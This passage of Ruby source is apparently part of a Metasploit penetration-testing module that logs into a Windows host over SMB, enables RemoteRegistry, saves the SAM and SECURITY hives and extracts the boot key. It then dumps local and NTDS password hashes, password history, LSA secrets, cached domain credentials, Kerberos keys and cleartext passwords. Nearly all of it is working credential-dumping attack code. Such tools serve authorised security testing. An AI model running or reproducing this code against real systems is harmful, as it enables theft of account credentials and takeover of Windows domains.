      extra_info << "LastLogonTimestamp=#{info[:last_logon] && info[:last_logon] > Time.at(0) ? info[:last_logon].strftime('%Y%m%d%H%M') : 'never'},"
      extra_info << "IsAdministrator=#{info[:admin]},"
      extra_info << "IsDomainAdmin=#{info[:domain_admin]},"
      extra_info << "IsEnterpriseAdmin=#{info[:enterprise_admin]}"
      print_line(pwdump + extra_info + '::')
      report_info("#{full_name} (#{sid}): #{extra_info}", 'user.info')
    end

    print_line("\n# Account Info:")
    user_info.each do |_sid, info|
      print_line("## #{info[:dn]}")
      print_line("- Administrator: #{info[:admin]}")
      print_line("- Domain Admin: #{info[:domain_admin]}")
      print_line("- Enterprise Admin: #{info[:enterprise_admin]}")
      print_line("- Password last changed: #{info[:pwd_last_set] && info[:pwd_last_set] > Time.at(0) ? info[:pwd_last_set] : 'never'}")
      print_line("- Last logon: #{info[:last_logon] && info[:last_logon] > Time.at(0) ? info[:last_logon] : 'never'}")
      print_line("- Account disabled: #{info[:disabled].nil? ? 'N/A' : info[:disabled]}")
      print_line("- Computer account: #{info[:computer_account].nil? ? 'N/A' : info[:computer_account]}")

      print_line("- Expired: #{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now}")
      print_line("- Password never expires: #{info[:password_never_expires].nil? ? 'N/A' : info[:password_never_expires]}")
      print_line("- Password not required: #{info[:password_not_required].nil? ? 'N/A' : info[:password_not_required]}")
    end

    print_line("\n# Password history (pwdump format - uid:rid:lmhash:nthash:::):")
    if @lm_hash_not_stored.nil?
      print_warning(
        'NoLMHash policy was not retrieved correctly and we don\'t know if '\
        'LMHashes are being stored or not. We are assuming it is stored and '\
        'the lmhash value will be displayed in the following hash. If it is '\
        "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
      )
    end
    user_info.each do |_sid, info|
      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"

      if info[:nt_history].size > 1 || info[:lm_history].size > 1
        info[:nt_history][1..].zip(info[:lm_history][1..]).reverse.each_with_index do |history, i|
          nt_h, lm_h = history
          lm_h = Net::NTLM.lm_hash('') if lm_h.nil? || @lm_hash_not_stored
          history_hash = "#{lm_h.unpack('H*')[0]}:#{nt_h.unpack('H*')[0]}"
          history_name = "#{full_name}_history#{i}"
          unless report_creds(history_name, history_hash, **credential_opts)
            vprint_bad("Error when reporting #{full_name} history hash ##{i}")
          end
          print_line("#{history_name}:#{info[:rid]}:#{history_hash}:::")
        end
      else
        vprint_line("No password history for #{full_name}")
      end
    end

    print_line("\n# Kerberos keys:")
    user_info.each do |_sid, info|
      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"

      if info[:kerberos_keys].nil? || info[:kerberos_keys].empty?
        vprint_line("No Kerberos keys for #{full_name}")
      else
        credential_opts[:type] = :krb_enc_key
        info[:kerberos_keys].each do |key|
          krb_enckey = {
            **key,
            # Map the SAMR kerberos key to an IANA compatible enctype before persisting
            enctype: SAMR_KERBEROS_TYPE_TO_IANA[key[:enctype]]
          }

          krb_enckey_to_s = krb_enc_key_to_s(krb_enckey)
          key_data = Metasploit::Credential::KrbEncKey.build_data(**krb_enckey)
          unless report_creds(full_name, key_data, **credential_opts)
            vprint_bad("Error when reporting #{full_name} kerberos key #{krb_enckey_to_s}")
          end
          print_line "#{full_name}:#{krb_enckey_to_s}"
        end
      end
    end

    print_line("\n# Clear text passwords:")
    user_info.each do |_sid, info|
      full_name = "#{domain_name}\\#{info[:username]}"

      if info[:clear_text_passwords].nil? || info[:clear_text_passwords].empty?
        vprint_line("No clear text passwords for #{full_name}")
      else
        credential_opts[:type] = :password
        info[:clear_text_passwords].each do |passwd|
          unless report_creds(full_name, passwd, **credential_opts)
            vprint_bad("Error when reporting #{full_name} clear text password")
          end
          print_line("#{full_name}:CLEARTEXT:#{passwd}")
        end
      end
    end
  ensure
    @samr.close_handle(@domain_handle) if @domain_handle
    @samr.close_handle(@builtin_domain_handle) if @builtin_domain_handle
    @samr.close_handle(@server_handle) if @server_handle
    @samr.close if @samr
    if dcerpc_client
      dcerpc_client.drs_unbind(ph_drs)
      dcerpc_client.close
    end
  end

  def do_cleanup
    print_status('Cleaning up...')
    if @service_should_be_stopped
      print_status('Stopping service RemoteRegistry...')
      svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
      @svcctl.control_service(svc_handle, RubySMB::Dcerpc::Svcctl::SERVICE_CONTROL_STOP)
    end

    if @service_should_be_disabled
      print_status('Disabling service RemoteRegistry...')
      @svcctl.change_service_config_w(svc_handle, start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED)
    end
  rescue RubySMB::Dcerpc::Error::SvcctlError => e
    vprint_warning("An error occured when cleaning up: #{e}")
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def open_sc_manager
    vprint_status('Opening Service Control Manager')
    @svcctl = @tree.open_file(filename: 'svcctl', write: true, read: true)

    vprint_status('Binding to \\svcctl...')
    @svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)
    vprint_good('Bound to \\svcctl')

    @svcctl.open_sc_manager_w(sock.peerhost)
  end

  def run
    unless db
      print_warning('Cannot find any active database. Extracted data will only be displayed here and NOT stored.')
    end

    connect
    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::NoAccess,
                "Unable to authenticate ([#{e.class}] #{e}).")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable,
                "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      @scm_handle = open_sc_manager
    rescue RubySMB::Error::RubySMBError => e
      print_warning(
        'Unable to connect to the remote Service Control Manager. It will fail '\
        "if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e})."
      )
    end

    begin
      enable_registry if @scm_handle
    rescue RubySMB::Error::RubySMBError => e
      print_error(
        "Error when checking/enabling the 'RemoteRegistry' service. It will "\
        "fail if it is stopped or disabled ([#{e.class}] #{e})."
      )
    end

    begin
      @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)
      @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
    rescue RubySMB::Error::RubySMBError => e
      if ['DOMAIN', 'ALL'].include?(action.name)
        print_warning(
          "Error when connecting to 'winreg' interface ([#{e.class}] #{e})... skipping"
        )
      else
        fail_with(Module::Failure::Unreachable,
                  "Error when connecting to 'winreg' interface ([#{e.class}] #{e})."\
                  'If it is a Domain Controller, you can still try DOMAIN action since '\
                  'it does not need RemoteRegistry')
      end
    end

    unless action.name == 'DOMAIN'
      boot_key = ''
      begin
        boot_key = get_boot_key if @winreg
      rescue RubySMB::Error::RubySMBError => e
        if ['DOMAIN', 'ALL'].include?(action.name)
          print_warning("Error when getting BootKey... skipping: #{e}")
        else
          print_error("Error when getting BootKey: #{e}")
        end
      end
      if boot_key.empty?
        if action.name == 'ALL'
          print_warning('Unable to get BootKey... skipping')
        else
          fail_with(Module::Failure::NotFound,
                    'Unable to get BootKey. If it is a Domain Controller, you can still '\
                    'try DOMAIN action since it does not need BootKey')
        end
      end
      report_info(boot_key.unpack('H*')[0], 'host.boot_key')
    end

    check_lm_hash_not_stored if @winreg

    if ['ALL', 'SAM'].include?(action.name)
      begin
        sam = save_sam
      rescue RubySMB::Error::RubySMBError => e
        if action.name == 'ALL'
          print_warning("Error when getting SAM hive... skipping ([#{e.class}] #{e}).")
        else
          print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
        end
        sam = nil
      end

      if sam
        reg_parser = Msf::Util::WindowsRegistry.parse(sam, name: :sam)
        dump_sam_hashes(reg_parser, boot_key)
      end
    end

    if ['ALL', 'CACHE', 'LSA'].include?(action.name)
      begin
        security = save_security
      rescue RubySMB::Error::RubySMBError => e
        if action.name == 'ALL'
          print_warning("Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).")
        else
          print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
        end
        security = nil
      end

      if security
        reg_parser = Msf::Util::WindowsRegistry.parse(security, name: :security)
        lsa_key = get_lsa_secret_key(reg_parser, boot_key)
        if lsa_key.nil? || lsa_key.empty?
          print_status('No LSA key, skip LSA secrets and cached hashes dump')
        else
          report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
          if ['ALL', 'LSA'].include?(action.name)
            dump_lsa_secrets(reg_parser, lsa_key)
          end
          if ['ALL', 'CACHE'].include?(action.name)
            nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
            if nlkm_key.nil? || nlkm_key.empty?
              print_status('No NLKM key (skip cached hashes dump)')
            else
              report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
              dump_cached_hashes(reg_parser, nlkm_key)
            end
          end
        end
      end
    end

    if ['ALL', 'DOMAIN'].include?(action.name)
      dump_ntds_hashes
    end

    do_cleanup
  rescue RubySMB::Error::RubySMBError => e
    fail_with(Module::Failure::UnexpectedReply, "[#{e.class}] #{e}")
  rescue Rex::ConnectionError => e
    fail_with(Module::Failure::Unreachable, "[#{e.class}] #{e}")
  rescue ::StandardError => e
    do_cleanup
    raise e
  ensure
    if @svcctl
      @svcctl.close_service_handle(@scm_handle) if @scm_handle
      @svcctl.close
    end
    @winreg.close if @winreg
    @tree.disconnect! if @tree
    simple.client.disconnect! if simple&.client.is_a?(RubySMB::Client)
    disconnect
  end

  private

  # @param [Hash] data The keyberos enc key, containing enctype, key and salt
  def krb_enc_key_to_s(data)
    enctype_name = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[data[:enctype]] || "0x#{data[:enctype].to_i.to_s(16)}"
    "#{enctype_name}:#{data[:key].unpack1('H*')}"
  end
end
